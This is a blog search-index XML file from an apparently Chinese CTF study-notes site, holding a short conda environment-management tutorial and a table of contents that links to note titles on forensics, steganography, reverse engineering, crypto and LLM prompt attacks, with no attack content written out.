<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>test</title>
    <link href="/2035/01/19/test/"/>
    <url>/2035/01/19/test/</url>
    
    <content type="html"><![CDATA[<p>ai_is_future</p>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E6%BF%80%E6%B4%BB%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <url>/2026/01/19/%E6%BF%80%E6%B4%BB%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h1><p><a href="https://blog.csdn.net/miracleoa/article/details/106115730">https://blog.csdn.net/miracleoa/article/details/106115730</a></p><p>一、管理conda：</p><p>（1）检查conda版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda --version<br></code></pre></td></tr></table></figure><p>（2）获取版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda --version或 conda -V<br></code></pre></td></tr></table></figure><p>（3）列出所有的环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda env list<br></code></pre></td></tr></table></figure><p>conda list命令用于查看conda下的包，而conda env list命令可以用来查看conda创建的所有虚拟环境。</p><p>（4）查看环境管理的全部命令帮助</p><p>conda env -h</p><p>（5）conda升级</p><p>我们可以在命令行中或者anaconda prompt中执行命令进行操作。</p><p>conda update conda升级conda</p><p>conda update anaconda升级anaconda前要先升级conda</p><p>conda update –all升级所有包</p><p>（6）conda升级后释放空间</p><p>在升级完成之后，我们可以使用命令来清理一些无用的包以释放一些空间：</p><p>conda clean -p删除没有用的包</p><p>conda clean -t删除保存下来的压缩文件（.tar）</p><p>二、管理环境</p><p>（1）创建环境</p><p>conda create -n env-name [list of package]。-n env-name是设置新建环境的名字，list of package是可选项，选择要为该环境安装的包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda create -n py38 python=3.8<br></code></pre></td></tr></table></figure><p>如果我们没有指定安装python的版本，conda会安装我们最初安装conda时所装的那个版本的python。</p><p>若创建特定python版本的包环境，需键入conda create -n env-name python&#x3D;3.6</p><p>（2）激活环境</p><p>Linux，OS X:</p><p>source activate env-name</p><p>Windows：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda activate py38<br></code></pre></td></tr></table></figure><p>小技巧：</p><p>新的开发环境会被默认安装在你conda目录下的envs文件目录下。你可以指定一个其他的路径；</p><p>（3）切换到base环境</p><p>如果要从你当前工作环境的路径切换到系统根目录时，键入：</p><p>Linux，OS X:</p><p>conda source deactivate</p><p>Windows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda deactivate <br></code></pre></td></tr></table></figure><p>（4）复制一个环境</p><p>通过克隆来复制一个环境。这儿将通过克隆snowfllakes来创建一个称为flowers的副本。</p><p>conda create -n flowers –clone snowflakes</p><p>通过conda env list来检查目前拥有的环境</p><p>（5）删除一个环境</p><p>如果你不想要这个名为flowers的环境，就按照如下方法移除该环境：</p><p>conda env remove -n flowers</p><p>三、管理包</p><p>（1）安装包 或 安装特定版本的包</p><p>conda install package-name</p><p>conda install package-name&#x3D;&#x3D;version</p><p>（2）查看所有已安装包</p><p>conda list</p><p>（3）卸载包</p><p>conda remove package-name</p><p>（4）更新包</p><p>更新一个包</p><p>conda update package-name</p><p>更新所有包</p><p>conda update –all</p><p>（5）搜索包</p><p>conda search search-term，可以模糊搜索</p><p>四、把环境添加到jupyter notebook</p><p>首先通过activate进入想要添加的环境中，然后安装ipykernel，接下来就可以进行添加了。</p><p>pip install ipykernel</p><p>python -m ipykernel install –name Python36Python36可以取与环境名不一样的名字，但方便起见建议统一</p><p>（1）查看已添加到jupyter notebook的kernel</p><p>我们可以使用jupyter kernelspec list来查看已添加到jupyter notebook的kernel。</p><p>显示如下：</p><p>PS C:\Users\25387&gt; jupyter kernelspec list</p><blockquote><p>更新: 2025-10-30 10:08:47<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/zcfdso3vs7d8rve8">https://www.yuque.com/chaye-apqbl/vsc85q/zcfdso3vs7d8rve8</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/index/"/>
    <url>/2026/01/19/index/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a><a href="%E6%BF%80%E6%B4%BB%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83.md">激活虚拟环境</a></h2><h2 id="博客"><a href="#博客" class="headerlink" title="博客"></a><a href="%E5%8D%9A%E5%AE%A2/index.md">博客</a></h2><ul><li><a href="%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.md">博客搭建</a></li><li><a href="%E5%8D%9A%E5%AE%A2/Typora%E7%A0%B4%E8%A7%A3.md">Typora破解</a></li></ul><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a><a href="kali/index.md">kali</a></h2><h3 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a><a href="kali/linux%E5%91%BD%E4%BB%A4/index.md">linux命令</a></h3><ul><li><a href="kali/linux%E5%91%BD%E4%BB%A4/conda%E6%BF%80%E6%B4%BB%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83.md">conda激活虚拟环境</a></li><li><a href="kali/linux%E5%91%BD%E4%BB%A4/%E6%8D%A2%E6%BA%90.md">换源</a></li><li><a href="kali/linux%E5%91%BD%E4%BB%A4/exportPATH=_$HOME_.local_bin_$PATH_.md">exportPATH&#x3D;<em>$HOME</em>.local_bin_$PATH_</a></li><li><a href="kali/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%BC%80%E5%90%AFeth0%E7%BD%91%E5%8D%A1.md">虚拟机开启eth0网卡</a></li><li><a href="kali/pip%E4%B8%8B%E8%BD%BD%E6%85%A2.md">pip下载慢</a></li><li><a href="kali/%E5%BC%80%E5%90%AFssh%E8%BF%9E%E6%8E%A5.md">开启ssh连接</a></li></ul><h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a><a href="%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.md">应急响应</a></h2><h3 id="玄机靶场"><a href="#玄机靶场" class="headerlink" title="玄机靶场"></a><a href="%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/index.md">玄机靶场</a></h3><ul><li><a href="%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/%E7%AC%AC%E4%B8%80%E7%AB%A0.md">第一章</a></li></ul><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul><li><a href="python/pyenv.md">pyenv</a></li></ul><h3 id="python数据库函数"><a href="#python数据库函数" class="headerlink" title="python数据库函数"></a>python数据库函数</h3><ul><li><a href="python/python%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%BD%E6%95%B0/SQL-decode%E5%87%BD%E6%95%B0.md">SQL-decode函数</a></li></ul><h2 id="Polis"><a href="#Polis" class="headerlink" title="Polis"></a>Polis</h2><ul><li><a href="Polis/2025%E6%9A%91%E5%81%87%E9%9B%86%E8%AE%AD%E2%80%94%E2%80%94MISC%E5%85%A5%E9%97%A8.md">2025暑假集训——MISC入门</a></li><li><a href="Polis/2025%E4%B8%8A%E5%BC%80%E6%94%BE%E5%AE%9E%E9%AA%8Cwp.md">2025上开放实验wp</a></li><li><a href="Polis/2024%E4%B8%8A%E5%BC%80%E6%94%BE%E5%AE%9E%E9%AA%8Cwp.md">2024上开放实验wp</a></li><li><a href="Polis/Misc%E2%80%94%E2%80%94%E5%85%A5%E9%97%A8.md">Misc——入门</a></li><li><a href="Polis/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8BRE%E2%80%94%E2%80%94%E5%85%A5%E9%97%A8.md">逆向工程RE——入门</a></li></ul><h2 id="大模型攻防"><a href="#大模型攻防" class="headerlink" title="大模型攻防"></a><a href="%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/index.md">大模型攻防</a></h2><ul><li><a href="%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB.md">大模型投毒攻击</a></li></ul><h3 id="Prompt攻击"><a href="#Prompt攻击" class="headerlink" title="Prompt攻击"></a><a href="%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/Prompt%E6%94%BB%E5%87%BB/index.md">Prompt攻击</a></h3><ul><li><a href="%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/Prompt%E6%94%BB%E5%87%BB/%E4%BE%8B%E9%A2%98.md">例题</a></li></ul><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a><a href="MISC/%E5%8F%96%E8%AF%81/index.md">取证</a></h3><ul><li><a href="MISC/%E5%8F%96%E8%AF%81/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81.md">内存取证</a></li><li><a href="MISC/%E5%8F%96%E8%AF%81/%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81.md">磁盘取证</a></li></ul><h3 id="语言"><a href="#语言" class="headerlink" title="语言"></a><a href="MISC/%E8%AF%AD%E8%A8%80/index.md">语言</a></h3><ul><li><a href="MISC/%E8%AF%AD%E8%A8%80/logo%E8%AF%AD%E8%A8%80.md">logo语言</a></li></ul><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a><a href="MISC/%E5%9F%BA%E7%A1%80/index.md">基础</a></h3><ul><li><a href="MISC/%E5%9F%BA%E7%A1%80/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6.md">特殊字符</a></li><li><a href="MISC/%E5%9F%BA%E7%A1%80/30%E7%A7%8D%E5%8A%A0%E5%AF%86.md">30种加密</a></li><li><a href="MISC/%E5%9F%BA%E7%A1%80/base64%E6%8D%A2%E8%A1%A8.md">base64换表</a></li><li><a href="MISC/%E5%9F%BA%E7%A1%80/%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93.md">杂项总结</a></li><li><a href="MISC/%E5%9F%BA%E7%A1%80/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.md">常见的文件头</a></li><li><a href="MISC/%E5%9F%BA%E7%A1%80/unicode.md">unicode</a></li><li><a href="MISC/%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E5%80%92%E5%BA%8F.md">文件倒序</a></li></ul><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a><a href="MISC/%E7%BC%96%E7%A0%81/index.md">编码</a></h3><ul><li><a href="MISC/%E7%BC%96%E7%A0%81/01%E7%BC%96%E7%A0%81.md">01编码</a></li><li><a href="MISC/%E7%BC%96%E7%A0%81/Cimbar.md">Cimbar</a></li><li><a href="MISC/%E7%BC%96%E7%A0%81/%E8%A7%A3%E5%AF%86.md">解密</a></li><li><a href="MISC/%E7%BC%96%E7%A0%81/ook%E7%BC%96%E7%A0%81.md">ook编码</a></li><li><a href="MISC/%E7%BC%96%E7%A0%81/base2048.md">base2048</a></li></ul><h3 id="txt加密"><a href="#txt加密" class="headerlink" title="txt加密"></a><a href="MISC/txt%E5%8A%A0%E5%AF%86/index.md">txt加密</a></h3><ul><li><a href="MISC/txt%E5%8A%A0%E5%AF%86/ook.md">ook</a></li><li><a href="MISC/txt%E5%8A%A0%E5%AF%86/Snow%E9%9B%AA.md">Snow雪</a></li></ul><h3 id="zip解密"><a href="#zip解密" class="headerlink" title="zip解密"></a><a href="MISC/zip%E8%A7%A3%E5%AF%86/index.md">zip解密</a></h3><ul><li><a href="MISC/zip%E8%A7%A3%E5%AF%86/zip%E6%A0%BC%E5%BC%8F.md">zip格式</a></li><li><a href="MISC/zip%E8%A7%A3%E5%AF%86/zlib%E8%A7%A3%E5%8E%8B.md">zlib解压</a></li><li><a href="MISC/zip%E8%A7%A3%E5%AF%86/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A5.md">爆破密钥</a></li><li><a href="MISC/zip%E8%A7%A3%E5%AF%86/zipcracker.md">zipcracker</a></li><li><a href="MISC/zip%E8%A7%A3%E5%AF%86/crc%E7%88%86%E7%A0%B4.md">crc爆破</a></li><li><a href="MISC/zip%E8%A7%A3%E5%AF%86/zip%E5%A5%97%E5%A8%83%E7%88%86%E7%A0%B4.md">zip套娃爆破</a></li><li><a href="MISC/zip%E8%A7%A3%E5%AF%86/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB.md">明文攻击</a></li></ul><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><ul><li><a href="MISC/%E9%9A%90%E5%86%99/%E9%9A%90%E5%86%99%E6%A6%82%E5%BF%B5.md">隐写概念</a></li></ul><h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a><a href="MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/index.md">图片隐写</a></h4><ul><li><a href="MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/stegsolve%E6%88%96%E8%80%85%E7%94%A8kali%E7%9A%84zsteg.md">stegsolve或者用kali的zsteg</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/exiftool.md">exiftool</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/gif%E6%96%87%E4%BB%B6.md">gif文件</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/f5%E9%9A%90%E5%86%99.md">f5隐写</a></li></ul><h4 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a><a href="MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/index.md">音频隐写</a></h4><ul><li><a href="MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/DeepSound.md">DeepSound</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/outguess.md">outguess</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/RXSSTV.md">RXSSTV</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/mp3stego%EF%BC%88%E4%B8%80%E5%AE%9A%E8%A6%81%E6%94%BE%E5%9C%A8MP3stgeo%E6%96%87%E4%BB%B6%E4%B8%8B%E9%9D%A2%EF%BC%89.md">mp3stego（一定要放在MP3stgeo文件下面）</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/audacity.md">audacity</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E6%96%87%E6%9C%AC%E9%9A%90%E5%86%99%EF%BC%88txt%E9%9B%B6%E5%AE%BD%E5%BA%A6%E9%9A%90%E5%86%99%EF%BC%89.md">文本隐写（txt零宽度隐写）</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/pyc%E9%9A%90%E5%86%99%EF%BC%88kali%E4%B8%8B%E4%BD%BF%E7%94%A8%EF%BC%89.md">pyc隐写（kali下使用）</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/dd%E6%8C%87%E4%BB%A4.md">dd指令</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/grep%E6%8C%87%E4%BB%A4.md">grep指令</a></li><li><a href="MISC/%E9%9A%90%E5%86%99/%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99.md">文档隐写</a></li></ul><h3 id="照片"><a href="#照片" class="headerlink" title="照片"></a><a href="MISC/%E7%85%A7%E7%89%87/index.md">照片</a></h3><ul><li><a href="MISC/%E7%85%A7%E7%89%87/mkBT%E9%9A%90%E5%86%99.md">mkBT隐写</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/IDAT%E9%9A%90%E5%86%99.md">IDAT隐写</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/SSTV%E8%A7%A3%E7%A0%81%E8%BD%AC%E5%9B%BE%E7%89%87.md">SSTV解码转图片</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/%E7%9B%B2%E6%B0%B4%E5%8D%B0.md">盲水印</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/01%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AC%E7%A0%81.md">01二进制转码</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/%E7%8C%AB%E5%8F%98%E6%8D%A2.md">猫变换</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/Tupper.md">Tupper</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/plot%E7%9A%84%E4%BD%BF%E7%94%A8.md">plot的使用</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%8B%BC%E5%9B%BE.md">二维码拼图</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/%E5%9B%BE%E7%89%87%E4%BF%AE%E5%A4%8D.md">图片修复</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/%E5%9B%BE%E7%89%87%E7%AF%87.md">图片篇</a></li><li><a href="MISC/%E7%85%A7%E7%89%87/%E9%BB%91%E7%99%BD%E7%85%A7%E7%89%87.md">黑白照片</a></li></ul><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><ul><li><a href="MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B5%81%E9%87%8F.md">虚拟机流量</a></li><li><a href="MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/WEBshell%E6%B5%81%E9%87%8F.md">WEBshell流量</a></li><li><a href="MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/USB%E6%B5%81%E9%87%8F.md">USB流量</a></li><li><a href="MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/wifi%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4.md">wifi密码爆破</a></li><li><a href="%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90.md">基础分析</a></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><a href="MISC/%E5%85%B6%E4%BB%96/index.md">其他</a></h3><ul><li><a href="MISC/%E5%85%B6%E4%BB%96/pdfcrack%E7%88%86%E7%A0%B4pdf%E5%AF%86%E7%A0%81.md">pdfcrack爆破pdf密码</a></li><li><a href="MISC/%E5%85%B6%E4%BB%96/%E6%B8%B8%E6%88%8F%E9%A2%98.md">游戏题</a></li><li><a href="MISC/%E5%85%B6%E4%BB%96/PPTX%E8%A7%A3%E5%AF%86.md">PPTX解密</a></li><li><a href="MISC/%E5%85%B6%E4%BB%96/PDF%E8%A7%A3%E5%AF%86.md">PDF解密</a></li><li><a href="MISC/%E5%85%B6%E4%BB%96/wayback.md">wayback</a></li><li><a href="MISC/%E5%85%B6%E4%BB%96/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1.md">日志审计</a></li></ul><h3 id="取证-1"><a href="#取证-1" class="headerlink" title="取证"></a><a href="MISC/%E5%8F%96%E8%AF%81/index.md">取证</a></h3><ul><li><a href="MISC/%E5%8F%96%E8%AF%81/.git%E6%96%87%E4%BB%B6.md">.git文件</a></li><li><a href="MISC/%E5%8F%96%E8%AF%81/raw%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81.md">raw内存取证</a></li><li><a href="MISC/Pythonjail%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8.md">Pythonjail沙盒逃逸</a></li></ul><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a><a href="RE/index.md">RE</a></h2><h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a><a href="RE/%E5%9F%BA%E7%A1%80/index.md">基础</a></h3><ul><li><a href="RE/%E5%9F%BA%E7%A1%80/base%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B.md">base加密过程</a></li><li><a href="RE/%E5%9F%BA%E7%A1%80/%E5%BF%AB%E6%8D%B7%E9%94%AE.md">快捷键</a></li><li><a href="RE/%E5%9F%BA%E7%A1%80/%E8%84%B1%E5%A3%B3.md">脱壳</a></li><li><a href="RE/%E5%9F%BA%E7%A1%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80.md">汇编语言</a></li><li><a href="RE/%E5%9F%BA%E7%A1%80/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4.md">汇编指令</a></li><li><a href="RE/%E5%9F%BA%E7%A1%80/%E7%AB%AF%E5%BA%8F.md">端序</a></li></ul><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a><a href="RE/%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/index.md">动态调试</a></h4><ul><li><a href="RE/%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/IDA%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6.md">IDA调试elf文件</a></li><li><a href="RE/%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96.md">数据提取</a></li><li><a href="RE/%E5%9F%BA%E7%A1%80/CE%E4%BF%AE%E6%94%B9.md">CE修改</a></li></ul><h3 id="各种语言"><a href="#各种语言" class="headerlink" title="各种语言"></a><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/index.md">各种语言</a></h3><ul><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/vbs%E9%80%86%E5%90%91.md">vbs逆向</a></li><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/nes%E9%80%86%E5%90%91.md">nes逆向</a></li><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/json%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91.md">json文件逆向</a></li><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/Java.md">Java</a></li></ul><h4 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/index.md">安卓逆向</a></h4><ul><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.md">动态调试</a></li></ul><h4 id="python反编译"><a href="#python反编译" class="headerlink" title="python反编译"></a><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/index.md">python反编译</a></h4><ul><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/conda%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83.md">conda创建虚拟环境</a></li><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/python%E9%80%86%E5%90%91%EF%BC%88pyc%E6%96%87%E4%BB%B6%EF%BC%89%E4%BE%8B%E9%A2%98.md">python逆向（pyc文件）例题</a></li><li><a href="RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/python%E5%AD%97%E8%8A%82%E7%A0%81%E9%80%86%E5%90%91.md">python字节码逆向</a></li></ul><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a><a href="RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/index.md">代码混淆</a></h3><ul><li><a href="RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E8%8A%B1%E6%8C%87%E4%BB%A4.md">花指令</a></li><li><a href="RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%B9%B3%E5%9D%A6%E5%8C%96.md">平坦化</a></li></ul><h3 id="算法逆向"><a href="#算法逆向" class="headerlink" title="算法逆向"></a><a href="RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/index.md">算法逆向</a></h3><ul><li><a href="RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/base64exp%EF%BC%88%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%AE%9A%E4%B9%89key%EF%BC%89.md">base64exp（可以自定义key）</a></li><li><a href="RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/TEA.md">TEA</a></li><li><a href="RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/RC4%E9%80%86%E5%90%91.md">RC4逆向</a></li><li><a href="RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/Z3%E9%80%86%E5%90%91%EF%BC%88%E8%A7%A3%E6%96%B9%E7%A8%8B%EF%BC%89.md">Z3逆向（解方程）</a></li></ul><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a><a href="RE/%E5%85%B6%E4%BB%96/index.md">其他</a></h3><ul><li><a href="RE/%E5%85%B6%E4%BB%96/ios%E9%80%86%E5%90%91.md">ios逆向</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/hap%EF%BC%88%E9%B8%BF%E8%92%99%E9%80%86%E5%90%91%EF%BC%89.md">hap（鸿蒙逆向）</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/ELF%E6%96%87%E4%BB%B6%E5%8F%8D%E7%BC%96%E8%AF%91.md">ELF文件反编译</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91.md">游戏逆向</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/ASM%E9%80%86%E5%90%91.md">ASM逆向</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/%E6%89%AB%E9%9B%B7%E9%80%86%E5%90%91.md">扫雷逆向</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/%E6%95%B0%E7%8B%AC%E9%80%86%E5%90%91.md">数独逆向</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/net%E9%80%86%E5%90%91.md">net逆向</a></li><li><a href="RE/%E5%85%B6%E4%BB%96/maze%E8%BF%B7%E5%AE%ABMD5.md">maze迷宫MD5</a></li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a><a href="RE/%E4%BE%8B%E9%A2%98/index.md">例题</a></h3><ul><li><a href="RE/%E4%BE%8B%E9%A2%98/moe%E5%BA%B7%E5%A4%8D%E8%AE%AD%E7%BB%83.md">moe康复训练</a></li></ul><h4 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h4><ul><li><a href="RE/%E4%BE%8B%E9%A2%98/NSSCTF/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86.md">字符串处理</a></li><li><a href="RE/%E4%BE%8B%E9%A2%98/NSSCTF/esaypyc.md">esaypyc</a></li><li><a href="RE/%E4%BE%8B%E9%A2%98/NSSCTF/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0python.random.md">伪随机数python.random</a></li><li><a href="RE/%E4%BE%8B%E9%A2%98/NSSCTF/easyre.md">easyre</a></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a><a href="Crypto/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/index.md">古典密码</a></h3><ul><li><a href="Crypto/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/%E5%87%AF%E6%92%92%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC.md">凯撒爆破脚本</a></li></ul><h3 id="现代加密"><a href="#现代加密" class="headerlink" title="现代加密"></a><a href="Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/index.md">现代加密</a></h3><ul><li><a href="Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/AES%E5%8A%A0%E5%AF%86.md">AES加密</a></li><li><a href="Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/RSA%E5%8A%A0%E5%AF%86.md">RSA加密</a></li></ul><h2 id="WP"><a href="#WP" 